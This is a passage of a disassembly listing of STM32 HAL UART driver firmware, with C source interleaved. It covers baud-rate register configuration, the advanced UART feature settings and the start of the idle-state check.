 8005a18:	4615      	mov	r5, r2
 8005a1a:	f04f 0200 	mov.w	r2, #0
 8005a1e:	f04f 0300 	mov.w	r3, #0
 8005a22:	022b      	lsls	r3, r5, #8
 8005a24:	ea43 6314 	orr.w	r3, r3, r4, lsr #24
 8005a28:	0222      	lsls	r2, r4, #8
 8005a2a:	68f9      	ldr	r1, [r7, #12]
 8005a2c:	6849      	ldr	r1, [r1, #4]
 8005a2e:	0849      	lsrs	r1, r1, #1
 8005a30:	2000      	movs	r0, #0
 8005a32:	4688      	mov	r8, r1
 8005a34:	4681      	mov	r9, r0
 8005a36:	eb12 0a08 	adds.w	sl, r2, r8
 8005a3a:	eb43 0b09 	adc.w	fp, r3, r9
 8005a3e:	68fb      	ldr	r3, [r7, #12]
 8005a40:	685b      	ldr	r3, [r3, #4]
 8005a42:	2200      	movs	r2, #0
 8005a44:	603b      	str	r3, [r7, #0]
 8005a46:	607a      	str	r2, [r7, #4]
 8005a48:	e9d7 2300 	ldrd	r2, r3, [r7]
 8005a4c:	4650      	mov	r0, sl
 8005a4e:	4659      	mov	r1, fp
 8005a50:	f7fa fbc4 	bl	80001dc <__aeabi_uldivmod>
 8005a54:	4602      	mov	r2, r0
 8005a56:	460b      	mov	r3, r1
 8005a58:	4613      	mov	r3, r2
 8005a5a:	61bb      	str	r3, [r7, #24]
        if ((usartdiv >= LPUART_BRR_MIN) && (usartdiv <= LPUART_BRR_MAX))
 8005a5c:	69bb      	ldr	r3, [r7, #24]
 8005a5e:	f5b3 7f40 	cmp.w	r3, #768	; 0x300
 8005a62:	d308      	bcc.n	8005a76 <UART_SetConfig+0x2b2>
 8005a64:	69bb      	ldr	r3, [r7, #24]
 8005a66:	f5b3 1f80 	cmp.w	r3, #1048576	; 0x100000
 8005a6a:	d204      	bcs.n	8005a76 <UART_SetConfig+0x2b2>
        {
          huart->Instance->BRR = usartdiv;
 8005a6c:	68fb      	ldr	r3, [r7, #12]
 8005a6e:	681b      	ldr	r3, [r3, #0]
 8005a70:	69ba      	ldr	r2, [r7, #24]
 8005a72:	60da      	str	r2, [r3, #12]
 8005a74:	e0c2      	b.n	8005bfc <UART_SetConfig+0x438>
        }
        else
        {
          ret = HAL_ERROR;
 8005a76:	2301      	movs	r3, #1
 8005a78:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
 8005a7c:	e0be      	b.n	8005bfc <UART_SetConfig+0x438>
      } /* if ( (pclk < (3 * huart->Init.BaudRate) ) || (pclk > (4096 * huart->Init.BaudRate) )) */
#endif /* USART_PRESC_PRESCALER */
    } /* if (pclk != 0) */
  }
  /* Check UART Over Sampling to set Baud Rate Register */
  else if (huart->Init.OverSampling == UART_OVERSAMPLING_8)
 8005a7e:	68fb      	ldr	r3, [r7, #12]
 8005a80:	69db      	ldr	r3, [r3, #28]
 8005a82:	f5b3 4f00 	cmp.w	r3, #32768	; 0x8000
 8005a86:	d16a      	bne.n	8005b5e <UART_SetConfig+0x39a>
  {
    switch (clocksource)
 8005a88:	f897 3023 	ldrb.w	r3, [r7, #35]	; 0x23
 8005a8c:	2b08      	cmp	r3, #8
 8005a8e:	d834      	bhi.n	8005afa <UART_SetConfig+0x336>
 8005a90:	a201      	add	r2, pc, #4	; (adr r2, 8005a98 <UART_SetConfig+0x2d4>)
 8005a92:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8005a96:	bf00      	nop
 8005a98:	08005abd 	.word	0x08005abd
 8005a9c:	08005add 	.word	0x08005add
 8005aa0:	08005ae5 	.word	0x08005ae5
 8005aa4:	08005afb 	.word	0x08005afb
 8005aa8:	08005aeb 	.word	0x08005aeb
 8005aac:	08005afb 	.word	0x08005afb
 8005ab0:	08005afb 	.word	0x08005afb
 8005ab4:	08005afb 	.word	0x08005afb
 8005ab8:	08005af3 	.word	0x08005af3
    {
      case UART_CLOCKSOURCE_PCLK1:
        pclk = HAL_RCC_GetPCLK1Freq();
 8005abc:	f7fe fdec 	bl	8004698 <HAL_RCC_GetPCLK1Freq>
 8005ac0:	61f8      	str	r0, [r7, #28]
        break;
 8005ac2:	e020      	b.n	8005b06 <UART_SetConfig+0x342>
 8005ac4:	efff69f3 	.word	0xefff69f3
 8005ac8:	40008000 	.word	0x40008000
 8005acc:	40013800 	.word	0x40013800
 8005ad0:	40021000 	.word	0x40021000
 8005ad4:	40004400 	.word	0x40004400
 8005ad8:	00f42400 	.word	0x00f42400
      case UART_CLOCKSOURCE_PCLK2:
        pclk = HAL_RCC_GetPCLK2Freq();
 8005adc:	f7fe fdf2 	bl	80046c4 <HAL_RCC_GetPCLK2Freq>
 8005ae0:	61f8      	str	r0, [r7, #28]
        break;
 8005ae2:	e010      	b.n	8005b06 <UART_SetConfig+0x342>
      case UART_CLOCKSOURCE_HSI:
        pclk = (uint32_t) HSI_VALUE;
 8005ae4:	4b4c      	ldr	r3, [pc, #304]	; (8005c18 <UART_SetConfig+0x454>)
 8005ae6:	61fb      	str	r3, [r7, #28]
        break;
 8005ae8:	e00d      	b.n	8005b06 <UART_SetConfig+0x342>
      case UART_CLOCKSOURCE_SYSCLK:
        pclk = HAL_RCC_GetSysClockFreq();
 8005aea:	f7fe fd3d 	bl	8004568 <HAL_RCC_GetSysClockFreq>
 8005aee:	61f8      	str	r0, [r7, #28]
        break;
 8005af0:	e009      	b.n	8005b06 <UART_SetConfig+0x342>
      case UART_CLOCKSOURCE_LSE:
        pclk = (uint32_t) LSE_VALUE;
 8005af2:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 8005af6:	61fb      	str	r3, [r7, #28]
        break;
 8005af8:	e005      	b.n	8005b06 <UART_SetConfig+0x342>
      default:
        pclk = 0U;
 8005afa:	2300      	movs	r3, #0
 8005afc:	61fb      	str	r3, [r7, #28]
        ret = HAL_ERROR;
 8005afe:	2301      	movs	r3, #1
 8005b00:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
        break;
 8005b04:	bf00      	nop
    }

    /* USARTDIV must be greater than or equal to 0d16 */
    if (pclk != 0U)
 8005b06:	69fb      	ldr	r3, [r7, #28]
 8005b08:	2b00      	cmp	r3, #0
 8005b0a:	d077      	beq.n	8005bfc <UART_SetConfig+0x438>
    {
#if defined(USART_PRESC_PRESCALER)
      usartdiv = (uint32_t)(UART_DIV_SAMPLING8(pclk, huart->Init.BaudRate, huart->Init.ClockPrescaler));
#else
      usartdiv = (uint32_t)(UART_DIV_SAMPLING8(pclk, huart->Init.BaudRate));
 8005b0c:	69fb      	ldr	r3, [r7, #28]
 8005b0e:	005a      	lsls	r2, r3, #1
 8005b10:	68fb      	ldr	r3, [r7, #12]
 8005b12:	685b      	ldr	r3, [r3, #4]
 8005b14:	085b      	lsrs	r3, r3, #1
 8005b16:	441a      	add	r2, r3
 8005b18:	68fb      	ldr	r3, [r7, #12]
 8005b1a:	685b      	ldr	r3, [r3, #4]
 8005b1c:	fbb2 f3f3 	udiv	r3, r2, r3
 8005b20:	61bb      	str	r3, [r7, #24]
#endif /* USART_PRESC_PRESCALER */
      if ((usartdiv >= UART_BRR_MIN) && (usartdiv <= UART_BRR_MAX))
 8005b22:	69bb      	ldr	r3, [r7, #24]
 8005b24:	2b0f      	cmp	r3, #15
 8005b26:	d916      	bls.n	8005b56 <UART_SetConfig+0x392>
 8005b28:	69bb      	ldr	r3, [r7, #24]
 8005b2a:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 8005b2e:	d212      	bcs.n	8005b56 <UART_SetConfig+0x392>
      {
        brrtemp = (uint16_t)(usartdiv & 0xFFF0U);
 8005b30:	69bb      	ldr	r3, [r7, #24]
 8005b32:	b29b      	uxth	r3, r3
 8005b34:	f023 030f 	bic.w	r3, r3, #15
 8005b38:	82fb      	strh	r3, [r7, #22]
        brrtemp |= (uint16_t)((usartdiv & (uint16_t)0x000FU) >> 1U);
 8005b3a:	69bb      	ldr	r3, [r7, #24]
 8005b3c:	085b      	lsrs	r3, r3, #1
 8005b3e:	b29b      	uxth	r3, r3
 8005b40:	f003 0307 	and.w	r3, r3, #7
 8005b44:	b29a      	uxth	r2, r3
 8005b46:	8afb      	ldrh	r3, [r7, #22]
 8005b48:	4313      	orrs	r3, r2
 8005b4a:	82fb      	strh	r3, [r7, #22]
        huart->Instance->BRR = brrtemp;
 8005b4c:	68fb      	ldr	r3, [r7, #12]
 8005b4e:	681b      	ldr	r3, [r3, #0]
 8005b50:	8afa      	ldrh	r2, [r7, #22]
 8005b52:	60da      	str	r2, [r3, #12]
 8005b54:	e052      	b.n	8005bfc <UART_SetConfig+0x438>
      }
      else
      {
        ret = HAL_ERROR;
 8005b56:	2301      	movs	r3, #1
 8005b58:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
 8005b5c:	e04e      	b.n	8005bfc <UART_SetConfig+0x438>
      }
    }
  }
  else
  {
    switch (clocksource)
 8005b5e:	f897 3023 	ldrb.w	r3, [r7, #35]	; 0x23
 8005b62:	2b08      	cmp	r3, #8
 8005b64:	d827      	bhi.n	8005bb6 <UART_SetConfig+0x3f2>
 8005b66:	a201      	add	r2, pc, #4	; (adr r2, 8005b6c <UART_SetConfig+0x3a8>)
 8005b68:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8005b6c:	08005b91 	.word	0x08005b91
 8005b70:	08005b99 	.word	0x08005b99
 8005b74:	08005ba1 	.word	0x08005ba1
 8005b78:	08005bb7 	.word	0x08005bb7
 8005b7c:	08005ba7 	.word	0x08005ba7
 8005b80:	08005bb7 	.word	0x08005bb7
 8005b84:	08005bb7 	.word	0x08005bb7
 8005b88:	08005bb7 	.word	0x08005bb7
 8005b8c:	08005baf 	.word	0x08005baf
    {
      case UART_CLOCKSOURCE_PCLK1:
        pclk = HAL_RCC_GetPCLK1Freq();
 8005b90:	f7fe fd82 	bl	8004698 <HAL_RCC_GetPCLK1Freq>
 8005b94:	61f8      	str	r0, [r7, #28]
        break;
 8005b96:	e014      	b.n	8005bc2 <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_PCLK2:
        pclk = HAL_RCC_GetPCLK2Freq();
 8005b98:	f7fe fd94 	bl	80046c4 <HAL_RCC_GetPCLK2Freq>
 8005b9c:	61f8      	str	r0, [r7, #28]
        break;
 8005b9e:	e010      	b.n	8005bc2 <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_HSI:
        pclk = (uint32_t) HSI_VALUE;
 8005ba0:	4b1d      	ldr	r3, [pc, #116]	; (8005c18 <UART_SetConfig+0x454>)
 8005ba2:	61fb      	str	r3, [r7, #28]
        break;
 8005ba4:	e00d      	b.n	8005bc2 <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_SYSCLK:
        pclk = HAL_RCC_GetSysClockFreq();
 8005ba6:	f7fe fcdf 	bl	8004568 <HAL_RCC_GetSysClockFreq>
 8005baa:	61f8      	str	r0, [r7, #28]
        break;
 8005bac:	e009      	b.n	8005bc2 <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_LSE:
        pclk = (uint32_t) LSE_VALUE;
 8005bae:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 8005bb2:	61fb      	str	r3, [r7, #28]
        break;
 8005bb4:	e005      	b.n	8005bc2 <UART_SetConfig+0x3fe>
      default:
        pclk = 0U;
 8005bb6:	2300      	movs	r3, #0
 8005bb8:	61fb      	str	r3, [r7, #28]
        ret = HAL_ERROR;
 8005bba:	2301      	movs	r3, #1
 8005bbc:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
        break;
 8005bc0:	bf00      	nop
    }

    if (pclk != 0U)
 8005bc2:	69fb      	ldr	r3, [r7, #28]
 8005bc4:	2b00      	cmp	r3, #0
 8005bc6:	d019      	beq.n	8005bfc <UART_SetConfig+0x438>
    {
      /* USARTDIV must be greater than or equal to 0d16 */
#if defined(USART_PRESC_PRESCALER)
      usartdiv = (uint32_t)(UART_DIV_SAMPLING16(pclk, huart->Init.BaudRate, huart->Init.ClockPrescaler));
#else
      usartdiv = (uint32_t)(UART_DIV_SAMPLING16(pclk, huart->Init.BaudRate));
 8005bc8:	68fb      	ldr	r3, [r7, #12]
 8005bca:	685b      	ldr	r3, [r3, #4]
 8005bcc:	085a      	lsrs	r2, r3, #1
 8005bce:	69fb      	ldr	r3, [r7, #28]
 8005bd0:	441a      	add	r2, r3
 8005bd2:	68fb      	ldr	r3, [r7, #12]
 8005bd4:	685b      	ldr	r3, [r3, #4]
 8005bd6:	fbb2 f3f3 	udiv	r3, r2, r3
 8005bda:	61bb      	str	r3, [r7, #24]
#endif /* USART_PRESC_PRESCALER */
      if ((usartdiv >= UART_BRR_MIN) && (usartdiv <= UART_BRR_MAX))
 8005bdc:	69bb      	ldr	r3, [r7, #24]
 8005bde:	2b0f      	cmp	r3, #15
 8005be0:	d909      	bls.n	8005bf6 <UART_SetConfig+0x432>
 8005be2:	69bb      	ldr	r3, [r7, #24]
 8005be4:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 8005be8:	d205      	bcs.n	8005bf6 <UART_SetConfig+0x432>
      {
        huart->Instance->BRR = (uint16_t)usartdiv;
 8005bea:	69bb      	ldr	r3, [r7, #24]
 8005bec:	b29a      	uxth	r2, r3
 8005bee:	68fb      	ldr	r3, [r7, #12]
 8005bf0:	681b      	ldr	r3, [r3, #0]
 8005bf2:	60da      	str	r2, [r3, #12]
 8005bf4:	e002      	b.n	8005bfc <UART_SetConfig+0x438>
      }
      else
      {
        ret = HAL_ERROR;
 8005bf6:	2301      	movs	r3, #1
 8005bf8:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
  huart->NbTxDataToProcess = 1;
  huart->NbRxDataToProcess = 1;
#endif /* USART_CR1_FIFOEN */

  /* Clear ISR function pointers */
  huart->RxISR = NULL;
 8005bfc:	68fb      	ldr	r3, [r7, #12]
 8005bfe:	2200      	movs	r2, #0
 8005c00:	669a      	str	r2, [r3, #104]	; 0x68
  huart->TxISR = NULL;
 8005c02:	68fb      	ldr	r3, [r7, #12]
 8005c04:	2200      	movs	r2, #0
 8005c06:	66da      	str	r2, [r3, #108]	; 0x6c

  return ret;
 8005c08:	f897 3022 	ldrb.w	r3, [r7, #34]	; 0x22
}
 8005c0c:	4618      	mov	r0, r3
 8005c0e:	3728      	adds	r7, #40	; 0x28
 8005c10:	46bd      	mov	sp, r7
 8005c12:	e8bd 8fb0 	ldmia.w	sp!, {r4, r5, r7, r8, r9, sl, fp, pc}
 8005c16:	bf00      	nop
 8005c18:	00f42400 	.word	0x00f42400

08005c1c <UART_AdvFeatureConfig>:
  * @brief Configure the UART peripheral advanced features.
  * @param huart UART handle.
  * @retval None
  */
void UART_AdvFeatureConfig(UART_HandleTypeDef *huart)
{
 8005c1c:	b480      	push	{r7}
 8005c1e:	b083      	sub	sp, #12
 8005c20:	af00      	add	r7, sp, #0
 8005c22:	6078      	str	r0, [r7, #4]
  /* Check whether the set of advanced features to configure is properly set */
  assert_param(IS_UART_ADVFEATURE_INIT(huart->AdvancedInit.AdvFeatureInit));

  /* if required, configure RX/TX pins swap */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_SWAP_INIT))
 8005c24:	687b      	ldr	r3, [r7, #4]
 8005c26:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005c28:	f003 0308 	and.w	r3, r3, #8
 8005c2c:	2b00      	cmp	r3, #0
 8005c2e:	d00a      	beq.n	8005c46 <UART_AdvFeatureConfig+0x2a>
  {
    assert_param(IS_UART_ADVFEATURE_SWAP(huart->AdvancedInit.Swap));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_SWAP, huart->AdvancedInit.Swap);
 8005c30:	687b      	ldr	r3, [r7, #4]
 8005c32:	681b      	ldr	r3, [r3, #0]
 8005c34:	685b      	ldr	r3, [r3, #4]
 8005c36:	f423 4100 	bic.w	r1, r3, #32768	; 0x8000
 8005c3a:	687b      	ldr	r3, [r7, #4]
 8005c3c:	6b5a      	ldr	r2, [r3, #52]	; 0x34
 8005c3e:	687b      	ldr	r3, [r7, #4]
 8005c40:	681b      	ldr	r3, [r3, #0]
 8005c42:	430a      	orrs	r2, r1
 8005c44:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure TX pin active level inversion */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_TXINVERT_INIT))
 8005c46:	687b      	ldr	r3, [r7, #4]
 8005c48:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005c4a:	f003 0301 	and.w	r3, r3, #1
 8005c4e:	2b00      	cmp	r3, #0
 8005c50:	d00a      	beq.n	8005c68 <UART_AdvFeatureConfig+0x4c>
  {
    assert_param(IS_UART_ADVFEATURE_TXINV(huart->AdvancedInit.TxPinLevelInvert));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_TXINV, huart->AdvancedInit.TxPinLevelInvert);
 8005c52:	687b      	ldr	r3, [r7, #4]
 8005c54:	681b      	ldr	r3, [r3, #0]
 8005c56:	685b      	ldr	r3, [r3, #4]
 8005c58:	f423 3100 	bic.w	r1, r3, #131072	; 0x20000
 8005c5c:	687b      	ldr	r3, [r7, #4]
 8005c5e:	6a9a      	ldr	r2, [r3, #40]	; 0x28
 8005c60:	687b      	ldr	r3, [r7, #4]
 8005c62:	681b      	ldr	r3, [r3, #0]
 8005c64:	430a      	orrs	r2, r1
 8005c66:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure RX pin active level inversion */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_RXINVERT_INIT))
 8005c68:	687b      	ldr	r3, [r7, #4]
 8005c6a:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005c6c:	f003 0302 	and.w	r3, r3, #2
 8005c70:	2b00      	cmp	r3, #0
 8005c72:	d00a      	beq.n	8005c8a <UART_AdvFeatureConfig+0x6e>
  {
    assert_param(IS_UART_ADVFEATURE_RXINV(huart->AdvancedInit.RxPinLevelInvert));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_RXINV, huart->AdvancedInit.RxPinLevelInvert);
 8005c74:	687b      	ldr	r3, [r7, #4]
 8005c76:	681b      	ldr	r3, [r3, #0]
 8005c78:	685b      	ldr	r3, [r3, #4]
 8005c7a:	f423 3180 	bic.w	r1, r3, #65536	; 0x10000
 8005c7e:	687b      	ldr	r3, [r7, #4]
 8005c80:	6ada      	ldr	r2, [r3, #44]	; 0x2c
 8005c82:	687b      	ldr	r3, [r7, #4]
 8005c84:	681b      	ldr	r3, [r3, #0]
 8005c86:	430a      	orrs	r2, r1
 8005c88:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure data inversion */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_DATAINVERT_INIT))
 8005c8a:	687b      	ldr	r3, [r7, #4]
 8005c8c:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005c8e:	f003 0304 	and.w	r3, r3, #4
 8005c92:	2b00      	cmp	r3, #0
 8005c94:	d00a      	beq.n	8005cac <UART_AdvFeatureConfig+0x90>
  {
    assert_param(IS_UART_ADVFEATURE_DATAINV(huart->AdvancedInit.DataInvert));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_DATAINV, huart->AdvancedInit.DataInvert);
 8005c96:	687b      	ldr	r3, [r7, #4]
 8005c98:	681b      	ldr	r3, [r3, #0]
 8005c9a:	685b      	ldr	r3, [r3, #4]
 8005c9c:	f423 2180 	bic.w	r1, r3, #262144	; 0x40000
 8005ca0:	687b      	ldr	r3, [r7, #4]
 8005ca2:	6b1a      	ldr	r2, [r3, #48]	; 0x30
 8005ca4:	687b      	ldr	r3, [r7, #4]
 8005ca6:	681b      	ldr	r3, [r3, #0]
 8005ca8:	430a      	orrs	r2, r1
 8005caa:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure RX overrun detection disabling */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_RXOVERRUNDISABLE_INIT))
 8005cac:	687b      	ldr	r3, [r7, #4]
 8005cae:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005cb0:	f003 0310 	and.w	r3, r3, #16
 8005cb4:	2b00      	cmp	r3, #0
 8005cb6:	d00a      	beq.n	8005cce <UART_AdvFeatureConfig+0xb2>
  {
    assert_param(IS_UART_OVERRUN(huart->AdvancedInit.OverrunDisable));
    MODIFY_REG(huart->Instance->CR3, USART_CR3_OVRDIS, huart->AdvancedInit.OverrunDisable);
 8005cb8:	687b      	ldr	r3, [r7, #4]
 8005cba:	681b      	ldr	r3, [r3, #0]
 8005cbc:	689b      	ldr	r3, [r3, #8]
 8005cbe:	f423 5180 	bic.w	r1, r3, #4096	; 0x1000
 8005cc2:	687b      	ldr	r3, [r7, #4]
 8005cc4:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 8005cc6:	687b      	ldr	r3, [r7, #4]
 8005cc8:	681b      	ldr	r3, [r3, #0]
 8005cca:	430a      	orrs	r2, r1
 8005ccc:	609a      	str	r2, [r3, #8]
  }

  /* if required, configure DMA disabling on reception error */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_DMADISABLEONERROR_INIT))
 8005cce:	687b      	ldr	r3, [r7, #4]
 8005cd0:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005cd2:	f003 0320 	and.w	r3, r3, #32
 8005cd6:	2b00      	cmp	r3, #0
 8005cd8:	d00a      	beq.n	8005cf0 <UART_AdvFeatureConfig+0xd4>
  {
    assert_param(IS_UART_ADVFEATURE_DMAONRXERROR(huart->AdvancedInit.DMADisableonRxError));
    MODIFY_REG(huart->Instance->CR3, USART_CR3_DDRE, huart->AdvancedInit.DMADisableonRxError);
 8005cda:	687b      	ldr	r3, [r7, #4]
 8005cdc:	681b      	ldr	r3, [r3, #0]
 8005cde:	689b      	ldr	r3, [r3, #8]
 8005ce0:	f423 5100 	bic.w	r1, r3, #8192	; 0x2000
 8005ce4:	687b      	ldr	r3, [r7, #4]
 8005ce6:	6bda      	ldr	r2, [r3, #60]	; 0x3c
 8005ce8:	687b      	ldr	r3, [r7, #4]
 8005cea:	681b      	ldr	r3, [r3, #0]
 8005cec:	430a      	orrs	r2, r1
 8005cee:	609a      	str	r2, [r3, #8]
  }

  /* if required, configure auto Baud rate detection scheme */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_AUTOBAUDRATE_INIT))
 8005cf0:	687b      	ldr	r3, [r7, #4]
 8005cf2:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005cf4:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8005cf8:	2b00      	cmp	r3, #0
 8005cfa:	d01a      	beq.n	8005d32 <UART_AdvFeatureConfig+0x116>
  {
    assert_param(IS_USART_AUTOBAUDRATE_DETECTION_INSTANCE(huart->Instance));
    assert_param(IS_UART_ADVFEATURE_AUTOBAUDRATE(huart->AdvancedInit.AutoBaudRateEnable));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_ABREN, huart->AdvancedInit.AutoBaudRateEnable);
 8005cfc:	687b      	ldr	r3, [r7, #4]
 8005cfe:	681b      	ldr	r3, [r3, #0]
 8005d00:	685b      	ldr	r3, [r3, #4]
 8005d02:	f423 1180 	bic.w	r1, r3, #1048576	; 0x100000
 8005d06:	687b      	ldr	r3, [r7, #4]
 8005d08:	6c1a      	ldr	r2, [r3, #64]	; 0x40
 8005d0a:	687b      	ldr	r3, [r7, #4]
 8005d0c:	681b      	ldr	r3, [r3, #0]
 8005d0e:	430a      	orrs	r2, r1
 8005d10:	605a      	str	r2, [r3, #4]
    /* set auto Baudrate detection parameters if detection is enabled */
    if (huart->AdvancedInit.AutoBaudRateEnable == UART_ADVFEATURE_AUTOBAUDRATE_ENABLE)
 8005d12:	687b      	ldr	r3, [r7, #4]
 8005d14:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 8005d16:	f5b3 1f80 	cmp.w	r3, #1048576	; 0x100000
 8005d1a:	d10a      	bne.n	8005d32 <UART_AdvFeatureConfig+0x116>
    {
      assert_param(IS_UART_ADVFEATURE_AUTOBAUDRATEMODE(huart->AdvancedInit.AutoBaudRateMode));
      MODIFY_REG(huart->Instance->CR2, USART_CR2_ABRMODE, huart->AdvancedInit.AutoBaudRateMode);
 8005d1c:	687b      	ldr	r3, [r7, #4]
 8005d1e:	681b      	ldr	r3, [r3, #0]
 8005d20:	685b      	ldr	r3, [r3, #4]
 8005d22:	f423 01c0 	bic.w	r1, r3, #6291456	; 0x600000
 8005d26:	687b      	ldr	r3, [r7, #4]
 8005d28:	6c5a      	ldr	r2, [r3, #68]	; 0x44
 8005d2a:	687b      	ldr	r3, [r7, #4]
 8005d2c:	681b      	ldr	r3, [r3, #0]
 8005d2e:	430a      	orrs	r2, r1
 8005d30:	605a      	str	r2, [r3, #4]
    }
  }

  /* if required, configure MSB first on communication line */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_MSBFIRST_INIT))
 8005d32:	687b      	ldr	r3, [r7, #4]
 8005d34:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005d36:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8005d3a:	2b00      	cmp	r3, #0
 8005d3c:	d00a      	beq.n	8005d54 <UART_AdvFeatureConfig+0x138>
  {
    assert_param(IS_UART_ADVFEATURE_MSBFIRST(huart->AdvancedInit.MSBFirst));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_MSBFIRST, huart->AdvancedInit.MSBFirst);
 8005d3e:	687b      	ldr	r3, [r7, #4]
 8005d40:	681b      	ldr	r3, [r3, #0]
 8005d42:	685b      	ldr	r3, [r3, #4]
 8005d44:	f423 2100 	bic.w	r1, r3, #524288	; 0x80000
 8005d48:	687b      	ldr	r3, [r7, #4]
 8005d4a:	6c9a      	ldr	r2, [r3, #72]	; 0x48
 8005d4c:	687b      	ldr	r3, [r7, #4]
 8005d4e:	681b      	ldr	r3, [r3, #0]
 8005d50:	430a      	orrs	r2, r1
 8005d52:	605a      	str	r2, [r3, #4]
  }
}
 8005d54:	bf00      	nop
 8005d56:	370c      	adds	r7, #12
 8005d58:	46bd      	mov	sp, r7
 8005d5a:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005d5e:	4770      	bx	lr

08005d60 <UART_CheckIdleState>:
  * @brief Check the UART Idle State.
  * @param huart UART handle.
  * @retval HAL status
  */
HAL_StatusTypeDef UART_CheckIdleState(UART_HandleTypeDef *huart)
{
 8005d60:	b580      	push	{r7, lr}
 8005d62:	b098      	sub	sp, #96	; 0x60
 8005d64:	af02      	add	r7, sp, #8
 8005d66:	6078      	str	r0, [r7, #4]
  uint32_t tickstart;

  /* Initialize the UART ErrorCode */
  huart->ErrorCode = HAL_UART_ERROR_NONE;
 8005d68:	687b      	ldr	r3, [r7, #4]
 8005d6a:	2200      	movs	r2, #0
 8005d6c:	f8c3 2084 	str.w	r2, [r3, #132]	; 0x84

  /* Init tickstart for timeout management */
  tickstart = HAL_GetTick();
 8005d70:	f7fb fb62 	bl	8001438 <HAL_GetTick>
 8005d74:	6578      	str	r0, [r7, #84]	; 0x54

  /* Check if the Transmitter is enabled */
  if ((huart->Instance->CR1 & USART_CR1_TE) == USART_CR1_TE)
 8005d76:	687b      	ldr	r3, [r7, #4]
 8005d78:	681b      	ldr	r3, [r3, #0]
 8005d7a:	681b      	ldr	r3, [r3, #0]
 8005d7c:	f003 0308 	and.w	r3, r3, #8
 8005d80:	2b08      	cmp	r3, #8
 8005d82:	d12e      	bne.n	8005de2 <UART_CheckIdleState+0x82>
  {
    /* Wait until TEACK flag is set */
    if (UART_WaitOnFlagUntilTimeout(huart, USART_ISR_TEACK, RESET, tickstart, HAL_UART_TIMEOUT_VALUE) != HAL_OK)
 8005d84:	f06f 437e 	mvn.w	r3, #4261412864	; 0xfe000000
 8005d88:	9300      	str	r3, [sp, #0]
 8005d8a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8005d8c:	2200      	movs	r2, #0
 8005d8e:	f44f 1100 	mov.w	r1, #2097152	; 0x200000
 8005d92:	6878      	ldr	r0, [r7, #4]
 8005d94:	f000 f88c 	bl	8005eb0 <UART_WaitOnFlagUntilTimeout>
 8005d98:	4603      	mov	r3, r0
 8005d9a:	2b00      	cmp	r3, #0
 8005d9c:	d021      	beq.n	8005de2 <UART_CheckIdleState+0x82>
    {
      /* Disable TXE interrupt for the interrupt process */
#if defined(USART_CR1_FIFOEN)
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_TXEIE_TXFNFIE));
#else
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_TXEIE));
 8005d9e:	687b      	ldr	r3, [r7, #4]
 8005da0:	681b      	ldr	r3, [r3, #0]
 8005da2:	63bb      	str	r3, [r7, #56]	; 0x38
 */
__STATIC_FORCEINLINE uint32_t __LDREXW(volatile uint32_t *addr)
{
    uint32_t result;

   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005da4:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8005da6:	e853 3f00 	ldrex	r3, [r3]
 8005daa:	637b      	str	r3, [r7, #52]	; 0x34
   return(result);
 8005dac:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8005dae:	f023 0380 	bic.w	r3, r3, #128	; 0x80
 8005db2:	653b      	str	r3, [r7, #80]	; 0x50
 8005db4:	687b      	ldr	r3, [r7, #4]
 8005db6:	681b      	ldr	r3, [r3, #0]
 8005db8:	461a      	mov	r2, r3
